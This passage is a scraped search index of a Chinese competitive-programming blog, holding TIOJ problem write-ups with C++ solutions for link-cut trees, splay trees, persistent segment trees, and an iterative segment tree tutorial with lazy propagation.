模板是參考日月卦長那裡的，大概不會有時間會為這篇補上解說吧，大家自己google\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 #pragma g++ optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026lt;cstdio\u0026gt; #include \u0026lt;bitset\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; typedef long long ll; const int N = 100025; inline char readchar() { const static int B = 1\u0026lt;\u0026lt;20; static char buf[B], *p, *q; // p,q would be initialized with nullptr if(p == q \u0026amp;\u0026amp; (q=(p=buf)+fread(buf,1,B,stdin)) == buf) return EOF; return *p++; } inline int nextint() { int x = 0, c = readchar(); while(\u0026#39;0\u0026#39;\u0026gt;c || c\u0026gt;\u0026#39;9\u0026#39;) c = readchar(); while(\u0026#39;0\u0026#39;\u0026lt;=c\u0026amp;\u0026amp;c\u0026lt;=\u0026#39;9\u0026#39;) x = x*10 + (c^\u0026#39;0\u0026#39;), c = readchar(); return x; } // \\sum{cnt[p] * w[p]} struct LinkCutTree { // Splay struct node { ll ws, sum; int laz, cnt, w; int ch[2], pa; } S[N]; bool isroot(int x) { // is the root of the splay tree return S[S[x].pa].ch[0]!=x \u0026amp;\u0026amp; S[S[x].pa].ch[1]!=x; } void add(int i, int d) { if(!i) return; S[i].laz += d; S[i].cnt += d; S[i].sum += S[i].ws * d; } void down(int i) { if(!i || !S[i].laz) return; add(S[i].ch[0],S[i].laz); add(S[i].ch[1],S[i].laz); S[i].laz = 0; } int stk[N]; void push(int i) { int p = 0; stk[p++] = i; while(!isroot(i)) stk[p++] = i = S[i].pa; while(p) down(stk[--p]); //if(!isroot(i)) push(S[i].pa); //down(i); } void pull(int i) { S[i].ws = S[S[i].ch[0]].ws + S[S[i].ch[1]].ws + S[i].w; S[i].sum = S[S[i].ch[0]].sum + S[S[i].ch[1]].sum + ll(S[i].cnt) * S[i].w; } void rot(int x) { int y = S[x].pa, z = S[y].pa; int d = (S[y].ch[1] == x); S[x].pa = z; if(!isroot(y)) S[z].ch[S[z].ch[1]==y] = x; S[y].ch[d] = S[x].ch[!d]; if(S[y].ch[d]) S[S[y].ch[d]].pa = y; S[x].ch[!d] = y, S[y].pa = x; pull(y), pull(x); } void splay(int x) { push(x); while(!isroot(x)) { int y = S[x].pa; if(!isroot(y)) { int z = S[y].pa; if(S[z].ch[0]==y ^ S[y].ch[0]==x) rot(x); else rot(y); } rot(x); } } // LCT int access(int x) { int last = 0; while(x) { splay(x); S[x].ch[1] = last; pull(x); last = x; x = S[x].pa; } return last; } ll query(int v){ return S[access(v)].sum; } void modify(int v,int d) { add(access(v),d); } } LCT; bitset\u0026lt;N\u0026gt; color; ll sumd,sumc; ll dis[N]; signed main() { int n = nextint(), q = nextint(); for(int i = 1; i \u0026lt; n; i++) { int a = nextint()+1; int b = nextint()+1; int w = nextint(); //LCT.addEdge(a,b,w); //LCT.addEdge(b,a,w); dis[b] = dis[a] + w; LCT.S[b] = {w,0,0,0,w,0,0,a}; //LCT.pull(b); } while(q--) { int t = nextint(); int x = nextint()+1; if(t == 2) { printf(\u0026#34;%lld\\n\u0026#34;, sumd + sumc*dis[x] - 2*LCT.query(x)); }else if(!color[x]) { color[x] = true, LCT.modify(x,1), sumc++, sumd += dis[x]; } } } ","permalink":"https://omeletwithoutegg.github.io/2019/12/14/TIOJ-1171-LCT/","tags":["template","tree","link-cut-tree"],"title":"TIOJ-1171-LCT"},{"contents":"小向的試煉 2-3：轉！(Rotate!) https://tioj.ck.tp.edu.tw/problems/1950\nDescription 給定長度$N$的排列，問「以交換任意兩個數字的方式排序這個序列需要多少次數」\n另外有$M$次修改，每次修改會交換數字$i$和數字$j$的位置，請輸出$M+1$行代表一開始和每次修改過後的答案\nSolution 已經知道每個數字應該被放到哪裡了，所以我們可以想到一個排序方法\n每次看某個位置$i$的數字$x$，如果和$i$不同的話就把$x$放到位置$x$的地方，再繼續對原本放在位置$x$的地方的數字做同樣的事\n可以發現這樣會形成好幾個「環」，例如範測的$(1, 4, 2, 5, 3)$會形成兩個環\n$$\n\\begin{pmatrix}\n1\n\\end{pmatrix}\n\\begin{pmatrix}\n4 \u0026amp; 5 \u0026amp; 3 \u0026amp; 2\n\\end{pmatrix}\n$$\n或是$(1, 6, 4, 5, 3, 2)$會形成三個環\n$$\n\\begin{pmatrix}\n1\n\\end{pmatrix}\n\\begin{pmatrix}\n6 \u0026amp; 2\n\\end{pmatrix}\n\\begin{pmatrix}\n4 \u0026amp; 5 \u0026amp; 3\n\\end{pmatrix}\n$$\n也就是說，每個環代表第一個元素要放到第二個元素的位置，第二個元素要放到第三個元素的位置\u0026hellip;以此類推\n一個大小$L$的環需要的交換次數是$L-1$，所以把$1\\dots n$的排列排序好所需的時間就是$n-($環的個數$)$\n用數學一點的講法就是一個置換可以分解成好多不相交的輪換(?)而且方法是唯一的喔\n考慮一下交換了兩個數字會發生什麼事:\n如果他們在同一個「環」裡面，那那個環就會被切成兩個環\n反之則會讓兩個環合在一起，變成一個「環」\n示意圖大概就是這樣\n要怎麼辦到這件事呢？快速把元素之間連接或者切斷，我們會想到使用鏈結串列，但是這樣無法判斷他們是否在同一個環裡面\n退而求其次可以使用二元樹來維護，用$\\mathcal{O}(\\log n)$獲得可以剪切又可以黏貼序列的神力(?)\n我選擇用splay來實作，詳細的原理自己google OwO\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 // __________________ // | ________________ | // || ____ || // || /\\ | || // || /__\\ | || // || / \\ |____ || // ||________________|| // |__________________| // \\###################\\ // \\###################\\ // \\ ____ \\ // \\_______\\___\\_______\\ // An AC a day keeps the doctor away. #pragma g++ optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026lt;bits/extc++.h\u0026gt; #ifdef local #define debug(x) (cerr\u0026lt;\u0026lt;#x\u0026lt;\u0026lt;\u0026#34; = \u0026#34;\u0026lt;\u0026lt;(x)\u0026lt;\u0026lt;\u0026#39;\\n\u0026#39;) #else #define debug(x) ((void)0) #endif // local using namespace std; typedef int64_t ll; constexpr ll N = 100025, INF = 1e18, MOD = 998244353, K = 64, inf = 1e9; struct Splay { struct node { int ch[2],pa; int lf[2]; // lf[0] is the leftmost element of this splay, lf[1] is the rightmost } T[N]; void pull(int i){ T[i].lf[0] = T[i].ch[0] ? T[T[i].ch[0]].lf[0] : i; T[i].lf[1] = T[i].ch[1] ? T[T[i].ch[1]].lf[1] : i; } bool isroot(int x){return T[x].pa==0;} bool dir(int x){return T[T[x].pa].ch[1] == x;} void rot(int x) { int y = T[x].pa, z = T[y].pa, d = dir(x); T[x].pa = z; if(!isroot(y)) T[z].ch[dir(y)] = x; T[T[x].ch[!d]].pa = y, T[y].ch[d] = T[x].ch[!d]; T[x].ch[!d] = y, T[y].pa = x; } int splay(int x) { while(!isroot(x)) { int y = T[x].pa; if(!isroot(y)) { if(dir(x) ^ dir(y)) rot(x); else rot(y); } rot(x); } return T[x].lf[0]; //like DSU, present a tree with unique element(leftmost) } // (A..., x, B...) -\u0026gt; (A...) + (x, B...) int cut(int x) { splay(x); int res = T[x].ch[0]; T[T[x].ch[0]].pa = 0, T[x].ch[0] = 0, T[x].lf[0] = x; return res; } // (A..., x, B...) + (C..., y, D...) -\u0026gt; (x, B...C..., y, D...A...) void link(int x, int y) { if(!x || !y || splay(x) == splay(y)) return; x = T[x].lf[1], y = T[y].lf[0]; splay(x), splay(y); T[y].pa = x, T[x].ch[1] = y; splay(y); } int poke(int x,int y) { if(splay(x) == splay(y)) { // (A..., x, B..., y, C...) -\u0026gt; (x, B...) + (y, C...A...) int a = cut(x); link(x,a); cut(y); return -1; }else { // (A..., x, B...) + (C..., y, D...) -\u0026gt; (x, B...A..., y, D...C...) int a = cut(x); int b = cut(y); link(x,a); link(y,b); link(x,y); return 1; } } void init(int n) { for(int i = 1; i \u0026lt;= n; i++) T[i].lf[0] = T[i].lf[1] = i, T[i].pa = T[i].ch[0] = T[i].ch[1] = 0; } /*void dfs(int i) { if(!i) return; dfs(T[i].ch[0]); cout \u0026lt;\u0026lt; i \u0026lt;\u0026lt; \u0026#39; \u0026#39;; dfs(T[i].ch[1]); } void dbg(int n) { //return; cout \u0026lt;\u0026lt; \u0026#34;===\\n\u0026#34;; for(int i = 1; i \u0026lt;= n; i++) if(isroot(i)) dfs(i), cout \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; cout \u0026lt;\u0026lt; \u0026#34;===\\n\\n\u0026#34;; }*/ } cycles; int n,q,v[N],vis[N],pos[N],ans; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; q; cycles.init(n); for(int i = 1; i \u0026lt;= n; i++) cin \u0026gt;\u0026gt; v[i], pos[v[i]] = i; for(int i = 1; i \u0026lt;= n; i++) if(!vis[i]) { int last = 0; for(int x = i; !vis[x]; x = pos[x]) { if(last) ans += cycles.poke(v[last],v[x]); vis[x] = 1; last = x; } } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; //tr.dbg(n); //return 0; while(q--) { int a,b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; ans += cycles.poke(a,b); cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; //tr.dbg(n); } } ","permalink":"https://omeletwithoutegg.github.io/2019/12/13/TIOJ-1950/","tags":["TIOJ","binary-tree","splay-tree"],"title":"TIOJ-1950"},{"contents":"黑色騎士團的逆襲野望 https://tioj.ck.tp.edu.tw/problems/1394\nDescription 自從黑色騎士團上次的最終野望被白色騎士豬殺苦破滅之後，黑色騎士團銷聲滅跡了一陣子，不過他們仍繼續計畫著侵略神聖的大不列顛帝國。\n終於他們發現了一個機會：原來大不列顛帝國的命脈就是對外輸出的藥品\u0026quot;REBRAIN\u0026quot;，只要能控制住它所有的運輸與加工途徑，那大不列顛帝國就完了！\n與之前一樣，他們只要佔領一個據點就可以控制與他相鄰的運輸途徑了！\n\u0026ldquo;REBRAIN\u0026quot;的運輸過程十分有趣，他有一個總工廠來製造\u0026quot;REBRAIN\u0026quot;的一些半成品，再依序經過幾個有向道路到下個加工地點進行加工，就這樣一直到完成成品，並且為了不讓產品流程出問題，他們的運輸路徑不會出現環狀或逆向的情況。\n不過黑色騎士團的人手有限，所以他們希望佔據最少的據點就可以完全控制整個運輸與加工途徑。\n註: 雖然是有向邊，不過相鄰的關係依然是互相的；另外雖然沒有講的很清楚，題目是有保證0號節點可以走到所有其他節點\nSolution 題目所求是最小點覆蓋，也就是在給定圖上要選幾個點才能保證所有邊都有一個端點被選到\n因為這題給的是DAG，所以我們可以考慮用DP的方式做\n狀態$dp[i][s]$代表$i$往子孫走的邊都已經保證有端點被選到的答案，若$s=1$代表有選$i$這個點，反之沒有\n可以知道如果沒有選$i$這個點，那他的子節點都一定要選，所以\n$$dp[i][0] = \\sum\\limits _ {j\\in son(i)} dp[j][1]$$\n如果選了$i$這個點，那他的子節點可選可不選，我們就取比較小的那個，有\n$$dp[i][1] = 1 + \\sum\\limits _ {j\\in son(i)} \\min(dp[j][0],dp[j][1])$$\n最後取的答案是0號節點選或不選取$\\min$\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 33001; int dp[N][2], vis[N]; vector\u0026lt;int\u0026gt; g[N]; void dfs(int i) { if(vis[i]) return; vis[i] = true; dp[i][0] = 0; dp[i][1] = 1; for(int j:g[i]) { dfs(j); dp[i][0] += dp[j][1]; dp[i][1] += min(dp[j][0],dp[j][1]); } } signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n,k; cin \u0026gt;\u0026gt; n; for(int i = 0,k; i \u0026lt; n; i++) { cin \u0026gt;\u0026gt; k; g[i].resize(k); for(int \u0026amp;j:g[i]) cin \u0026gt;\u0026gt; j; } dfs(0); cout \u0026lt;\u0026lt; min(dp[0][0], dp[0][1]) \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } ","permalink":"https://omeletwithoutegg.github.io/2019/12/13/TIOJ-1394/","tags":["TIOJ","dp","DAG"],"title":"TIOJ-1394"},{"contents":"[APIO \u0026lsquo;08] Beads [Interactive] https://tioj.ck.tp.edu.tw/problems/1739\nDescription 有一個長度$n$的序列$a$，一開始$a_i = i$\n接下來有$m$個操作，每個操作只會交換相鄰的兩個數字\n接著有$q$個詢問，每次會詢問：第$t$個操作之後，數字$x$被放到哪個位置？\n$n,m,q \\leq 3 \\times 10^5; 1 \\leq x \\leq n; 1 \\leq t \\leq m$\nSolution 對序列保存不同的版本，當然持久化資料結構砸下去就對啦\n是說本來想寫treap不過我實作能力好差QQ\n什麼？你想問什麼是持久化？\n反正就是用樹來存一個序列啦，然後因為改一個數字時只要改他到根的那條鏈就好了啦，這樣每次修改新增的點數會和樹高一樣\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 // __________________ // | ________________ | // || ____ || // || /\\ | || // || /__\\ | || // || / \\ |____ || // ||________________|| // |__________________| // \\###################\\ // \\###################\\ // \\ ____ \\ // \\_______\\___\\_______\\ // An AC a day keeps the doctor away. #pragma g++ optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define debug(x) (cerr\u0026lt;\u0026lt;#x\u0026lt;\u0026lt;\u0026#34; = \u0026#34;\u0026lt;\u0026lt;(x)\u0026lt;\u0026lt;\u0026#39;\\n\u0026#39;) #else #define debug(x) ((void)0) #endif // local using namespace std; typedef int64_t ll; constexpr ll N = 300025, K = 64; #include \u0026#34;lib1739.h\u0026#34; struct segtree { struct node { int l,r,val; } S[N*K]; int tot; int newnode(int v) { return S[++tot] = {0,0,v}, tot; } int newnode(int l,int r) { return S[++tot] = {l,r,0}, tot; } int build(int l, int r) { if(l+1 == r) return newnode(l); int m = l+(r-l\u0026gt;\u0026gt;1); return newnode(build(l,m),build(m,r)); } int modify(int root, int p, int k, int l, int r) { if(l+1 == r) return newnode(k); int m = l+(r-l\u0026gt;\u0026gt;1); if(p \u0026lt; m) return newnode(modify(S[root].l,p,k,l,m), S[root].r); else return newnode(S[root].l, modify(S[root].r,p,k,m,r)); } int query(int root, int p, int l, int r) { while(l+1 \u0026lt; r) { int m = l+(r-l\u0026gt;\u0026gt;1); if(p \u0026lt; m) r = m, root = S[root].l; else l = m, root = S[root].r; } return S[root].val; } } sgt; int n,m; int root[N],chg[N],v[N],pos[N]; void init() { root[0] = sgt.build(1,n+1); for(int i = 1; i \u0026lt;= n; i++) v[i] = pos[i] = i; for(int i = 1; i \u0026lt;= m; i++) { int a = chg[i], b = chg[i]+1; int r = sgt.modify(root[i-1],v[a],pos[v[b]],1,n+1); root[i] = sgt.modify(r,v[b],pos[v[a]],1,n+1); swap(pos[v[a]], pos[v[b]]); swap(v[a], v[b]); } } signed main() { scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;n, \u0026amp;m); for(int i = 1; i \u0026lt;= m; i++) scanf(\u0026#34;%d\u0026#34;, chg+i); init(); int q = getNumQuestions(); while(q--) { int A,B; getQuestion(A, B); answer(sgt.query(root[B],A,1,n+1)); } } ","permalink":"https://omeletwithoutegg.github.io/2019/12/11/TIOJ-1739/","tags":["TIOJ","data-structure"],"title":"TIOJ-1739"},{"contents":"小向的試煉 2-1：洞穴(Cave) https://tioj.ck.tp.edu.tw/problems/1948\nDescription 小向在洞穴裡偵察到了$N$個烏龍，不知道是本尊還是分身。不過他們在洞穴中都是以每秒1公分的速度前進，只是有的朝著左邊的入口前進，而有的朝著右邊的入口前進。而由於洞穴相當狹窄，兩個相向的烏龍相撞時會回頭。小向大膽猜測，本尊一定會在所有分身都出洞穴被小向打敗後才出洞穴，瞄準小向用盡魔力的那剎那攻擊小向。不過她也沒那麼多時間等所有分身慢慢走出來再找到本尊，所以小向希望能直接用她剛剛偵察到的資訊判斷哪個是本尊。($N\\leq10^6$，洞穴的長度$L\\leq10^9$)\n注意：離開洞穴的定義是從左邊的入口往左走一步或從右邊的入口往右走一步。保證答案唯一，並且所有烏龍都在不同位置。\nSolution 首先若不管烏龍的編號，只想知道烏龍最後的位置，兩個烏龍相撞並回頭時可以當作穿過去\n顯然地，我們可以知道所有烏龍最晚離開洞穴的時刻，就等於每隻烏龍單獨放在洞穴內離開洞穴的時刻的最大值，我們也能知道最後一隻離開洞穴的烏龍是向左還是向右\n接著可以發現在烏龍相撞的過程中，左右順序一定不會變，意思是如果某個編號$i$的烏龍一開始是x座標第$k$大的，那不管經過多少次的相撞，他仍然會是x座標第$k$大的\n同時向左的烏龍數量與向右的烏龍數量也不會變\n所以，我們可以知道最後一隻烏龍離開洞穴時，一定是左邊全部向左，右邊全部向右，而那隻最後離開的烏龍一定是「向左的烏龍中最右邊的或者向右的烏龍中最左邊的」，也就知道了最後離開的烏龍是x座標第幾大的了\n用 nth_element 可以快速找出x座標第$k$大的編號，注意一開始他給的編號沒有按照x座標排序，上述推論必須先照x座標排序才會是對的= =\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #pragma g++ optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026lt;cstdio\u0026gt; #include \u0026lt;algorithm\u0026gt; const int N = 1000001; int n,L,x[N],id[N],cnt; signed main() { int t = -1e9, dir, pos; scanf(\u0026#34;%d%d\u0026#34;,\u0026amp;n,\u0026amp;L); for(int i = 0,d; i \u0026lt; n; i++) { scanf(\u0026#34;%d%d\u0026#34;,x+i,\u0026amp;d); int dis = d ? L-x[i] : x[i]; if(t \u0026lt; dis) t = dis, dir = d; if(!d) cnt++; } pos = cnt+dir-1; for(int i = 0; i \u0026lt; n; i++) id[i] = i; std::nth_element(id,id+pos,id+n,[](int a,int b){return x[a]\u0026lt;x[b];}); printf(\u0026#34;%d\\n\u0026#34;, id[pos]); } ","permalink":"https://omeletwithoutegg.github.io/2019/12/11/TIOJ-1948/","tags":["TIOJ","math"],"title":"TIOJ-1948"},{"contents":"迭代式線段樹 先備知識: 線段樹(帶懶標) + 位元運算(吧)\n如果讀者還不知道線段樹的原理最好看遞迴的(?)\n單點修改 例題仍然是萬年RMQ\n給定一個長度$n$的序列，請支援以下操作\n將位置$p$的值改為$x$ 查詢區間$[l,r)$的最大值 完美二元樹 首先假定$n$是2的冪次，思考可能可以簡單一些\n我們一樣用1當根，並且節點i的左右子樹會是i*2和i*2+1或寫成i\u0026lt;\u0026lt;1, i\u0026lt;\u0026lt;1|1\n1 2 const int N = 1\u0026lt;\u0026lt;18; int tr[N\u0026lt;\u0026lt;1], n; 對於初始化來說，可以發現葉子節點對應的都是長度$1$的區間，正好是原序列的值，所以可以直接讀入或另外傳入賦值給 tr[i+n]，接著可以用遞減的順序把其他長度的區間的答案算好\n1 2 3 4 void build(int v[]) { for(int i = 0; i \u0026lt; n; i++) tr[i+n] = v[i]; for(int i = n-1; i \u0026gt; 0; i--) tr[i] = max(tr[i\u0026lt;\u0026lt;1], tr[i\u0026lt;\u0026lt;1|1]); } 更新一個節點$p$，那麼只有$p$的所有祖先的答案會被影響到\n注意 p^1 代表 p 的兄弟節點，也就是 p 父親的另一個兒子\n1 2 3 4 void modify(int p, int x) { for(tr[p+=n] = x; p \u0026gt; 1; p\u0026gt;\u0026gt;=1) tr[p\u0026gt;\u0026gt;1] = max(tr[p],tr[p^1]); } 至於區間的查詢就沒有那麼顯然了，我們一樣必須把詢問的區間拆分成線段樹上的一些區間，而且數量不能超過$\\mathcal{O}(\\log n)$\n事實上，每一層我們至多只會拿前後兩個節點，並且拿完了之後就把左界增加或右界減少，越往上待選節點所代表區間會越短\n如果採用左閉右開的話規則可以歸納如下:\n首先 l+=n, r+=n 從最下面那層開始 重複執行直到區間為空(l\u0026gt;=r) 如果 l 是他父親的右子樹，則必須取走編號 l 的節點，並將 l 在該層往右一格 如果 r-1 是他父親的左子樹，則必須取走編號 r-1 的節點，並將 r 在該層往左一格 把 l,r 都往上提升一層 1 2 3 4 5 6 7 8 int query(int l, int r) { // [l,r) int res = -1e9; for(l+=n,r+=n; l\u0026lt;r; l\u0026gt;\u0026gt;=1,r\u0026gt;\u0026gt;=1) { if(l\u0026amp;1) res = max(res, tr[l++]); if(r\u0026amp;1) res = max(res, tr[--r]); } return res; } 嗯\u0026hellip;如果看不懂的話也可以接受這就是把$[l,r)$區間拆成線段樹上$2\\log n$個節點就好\n和那些噁心的遞迴參數say goodbye吧! \\迭代式線段樹/\n如果n不是2的冪次? 如果題目需要的運算有單位元素的話，可以在後面補上單位元素直到n是2的冪次\n不過令人意外的是， 上面的程式碼對任意的n都正確!\n讓我們來看看 n = 13 的例子\n現在它不是一棵完美二元樹了，而是很多棵: 以 2 為根高度4的、以 13 為根高度1的、以 7 為根高度2的\n畫上底線的節點在 query 的時候不會被動到，所以實際上它們是什麼值都沒有差\nn不是2的冪次的時候這個演算法仍然正確的原因，可能是它可以被證明和另一個更大二元樹同構吧，不過我也不會證明所以請讀者自己參透(X)\n不把n提高到2的冪次，除了讓程式碼更好看之外，空間使用量也從 $4n$ 減少到了 $2n$\n不過同時也有一些缺點，例如不好在線段樹上二分搜，沒有 1 號節點代表全域的答案等等(如果沒有交換律)\n不遵守交換律的區間查詢? 其實這很容易解決，直接上code\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 node query(int l, int r) { node resl, resr; // initialized as identity for(l+=n,r+=n; l\u0026lt;r; l\u0026gt;\u0026gt;=1,r\u0026gt;\u0026gt;=1) { if(l\u0026amp;1) resl = combine(resl, tr[l++]); if(r\u0026amp;1) resr = combine(tr[--r], resr); } return combine(resl, resr); } void pull(int p) { while(p \u0026gt; 1) { p \u0026gt;\u0026gt;= 1; tr[p] = combine(tr[p\u0026lt;\u0026lt;1],tr[p\u0026lt;\u0026lt;1|1]) tr[p] = applyTag(tr[p], tag[p]); } } 畢竟區間 query 的原理就是拿每一層前後的區間，所以只要對前後分開存就好了\n應王勻的要求把 pull 也補上，因為沒有交換律的時候不能用 combine(tr[p], tr[p^1]) @@\n什麼? 你問我沒有結合律怎麼辦?\n一個小常識是線段樹必須滿足結合律才能使用\u0026hellip;\u0026hellip;\n迭代型線段樹 with 懶標 進到了大家最需要，也是最常寫爛的部分了owo\nzkw自己似乎是喜歡差分、懶標永久化之類的寫法，不過太精妙了先不解釋XD\n現在題目的單點修改操作變成了區間修改\n把區間$[l,r)$的數字都增加$x$ 首先我們需要額外的陣列代表懶標，而其長度只需要n，因為葉子節點不需再往下傳遞懶標\n1 int tag[N]; Helper Methods 區間修改時，我們就在存取到的那些節點的答案和懶標都加上$x$，因此有了\n1 2 3 4 void upd(int p, int x) { tr[p] += x; if(p \u0026lt; n) tag[p] += x; } 再看一次這張圖，可以想像有兩條分別通過 l 和 r-1 的垂直線，這條線通過的節點是懶標會影響到目前區間答案的節點，所以必須把懶標往下傳\n順序要由上而下，把 p 的祖先節點的懶標往下推\n細節請看code\n1 2 3 4 5 6 7 8 9 void push(int p) { for(int h = __lg(n); h \u0026gt;= 0; h--) { int i = p\u0026gt;\u0026gt;h; // hth ancestor of p if(!tag[i\u0026gt;\u0026gt;1]) continue; upd(i, tag[i\u0026gt;\u0026gt;1]); upd(i^1, tag[i\u0026gt;\u0026gt;1]); tag[i\u0026gt;\u0026gt;1] = 0; } } 另外修改之後也同樣需要對 l 和 r-1 的祖先 pull ，順序要由下而上\n1 2 3 4 5 6 7 void pull(int p) { while(p \u0026gt; 1) { // do not forget the tag[p\u0026gt;\u0026gt;1] term tr[p\u0026gt;\u0026gt;1] = max(tr[p],tr[p^1])+tag[p\u0026gt;\u0026gt;1]; p \u0026gt;\u0026gt;= 1; } } Lazy Propagation! 寫好這兩個函式後，區間修改就不是難事啦\n別忘了:\nquery 前要 push modify 前要 push ， modify 後要 pull 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 int query(int l,int r) { push(l+n), push(r-1+n); int res = -1e9; for(l+=n,r+=n; l\u0026lt;r; l\u0026gt;\u0026gt;=1,r\u0026gt;\u0026gt;=1) { if(l\u0026amp;1) res = max(res, tr[l++]); if(r\u0026amp;1) res = max(res, tr[--r]); } return res; } void modify(int l,int r, int d) { int tl = l, tr = r; push(l+n), push(r-1+n); for(l+=n,r+=n; l\u0026lt;r; l\u0026gt;\u0026gt;=1,r\u0026gt;\u0026gt;=1) { if(l\u0026amp;1) upd(l++, d); if(r\u0026amp;1) upd(--r, d); } // uses tl,tr here for l,r changed pull(tl+n), pull(tr-1+n); } 全都是同一個框架，實在是舒服啊!\n除非時間先後順序會影響到所需的運算，例如同時有乘值和加值兩種操作，否則 modify 前可以不用 push\n區間和 有人可能想到了，有些懶標操作需要區間長度，例如區間加值區間和，怎麼辦呢?\n所有節點代表的區間長度都是2的冪次，也和它與葉子的距離有關\n只需修改一下便可\n以下順便附上完整的區間加值區間和的程式碼，以筆者習慣的風格撰寫\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 const int N = 200000; struct segtree { long long sum[N\u0026lt;\u0026lt;1], tag[N], n; void upd(int p, long long d, int h) { sum[p] += d\u0026lt;\u0026lt;h; if(p \u0026lt; n) tag[p] += d; } void pull(int p) { for(int h=1; p\u0026gt;1; p\u0026gt;\u0026gt;=1, h++) sum[p\u0026gt;\u0026gt;1] = sum[p^1]+sum[p] + (tag[p\u0026gt;\u0026gt;1]\u0026lt;\u0026lt;h); } void push(int p) { for(int h = __lg(n); h \u0026gt;= 0; h--) { int i = p\u0026gt;\u0026gt;h; if(!tag[i\u0026gt;\u0026gt;1]) continue; upd(i,tag[i\u0026gt;\u0026gt;1],h); upd(i^1,tag[i\u0026gt;\u0026gt;1],h); tag[i\u0026gt;\u0026gt;1] = 0; } } void add(int l,int r,long long k) { int tl = l, tr = r, h = 0; push(l+n), push(r-1+n); for(l+=n, r+=n; l\u0026lt;r; l\u0026gt;\u0026gt;=1, r\u0026gt;\u0026gt;=1, h++) { if(l\u0026amp;1) upd(l++,k,h); if(r\u0026amp;1) upd(--r,k,h); } pull(tl+n), pull(tr-1+n); } long long query(int l,int r) { // [l,r) long long res = 0; push(l+n), push(r-1+n); for(l+=n, r+=n; l\u0026lt;r; l\u0026gt;\u0026gt;=1, r\u0026gt;\u0026gt;=1) { if(l\u0026amp;1) res += sum[l++]; if(r\u0026amp;1) res += sum[--r]; } return res; } void init(long long v[],int _n) { n = _n; for(int i = 0; i \u0026lt; n; i++) sum[i+n] = v[i]; for(int i = n-1; i \u0026gt; 0; i--) sum[i] = sum[i\u0026lt;\u0026lt;1]+sum[i\u0026lt;\u0026lt;1|1]; } } sgt; 參考資料 https://codeforces.com/blog/entry/18051\n寫這篇好久ㄛ，本來想寫全國模擬賽的題解，不過既然學長都給了我還是算了吧(汗)\n","permalink":"https://omeletwithoutegg.github.io/2019/12/07/Iterative-SegmentTree/","tags":["template","tutorial","data-structure"],"title":"Iterative-SegmentTree"},{"contents":"B.廢文大資料 mining https://tioj.ck.tp.edu.tw/problems/2017\nDescription 給定一個序列 $a_i$ ，問有多少區間 $[l,r]$ 使得存在一個 $m \\leq r$ 滿足 $\\sum\\limits _ {i=l}^m a_i \u0026lt; 0$？\nSolution 先對 $a_i$ 做前綴 $s_k = \\sum\\limits _ {i=1}^k a_i$\n對於一個固定的 $l$ 來說，題目等價於找到一個最小的 $m$ 使得 $s_m - s _ {l-1} \u0026lt; 0$\n在 $m$ 之後的 $r$ 都會被算在答案裡面\n可以用單調隊列幫每個 $i$ 找到最小的 $i\u0026rsquo;$ 使得 $s _ {i\u0026rsquo;} \u0026lt; s_i$ ，複雜度 $\\mathcal{O}(n)$\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 1000025; long long n,a[N],stk[N],p,R[N]; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); cin \u0026gt;\u0026gt; n; for(int i = 1; i \u0026lt;= n; i++) cin \u0026gt;\u0026gt; a[i]; for(int i = 1; i \u0026lt;= n; i++) a[i] += a[i-1]; //for(int i = 0; i \u0026lt;= n; i++) cout \u0026lt;\u0026lt; v[i] \u0026lt;\u0026lt; \u0026#39; \u0026#39;; cout \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; long long sum = 0; 